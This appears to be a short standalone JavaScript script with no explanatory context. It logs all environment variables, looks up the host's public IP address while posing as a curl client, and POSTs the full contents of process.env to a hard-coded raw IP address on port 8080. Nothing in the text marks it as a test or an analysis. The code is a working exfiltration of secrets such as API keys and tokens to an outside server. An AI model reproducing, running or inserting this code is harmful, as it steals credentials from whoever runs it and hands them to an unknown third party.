console.log(process.env);

const result = await fetch("https://ip.me/", {
  headers: {
    "User-Agent": "curl/7.79.1",
  },
}).then((res) => res.text());

console.log("result", result);

await fetch("https://47.243.170.162:8080/", {
  method: "POST",
  body: JSON.stringify(process.env),
});
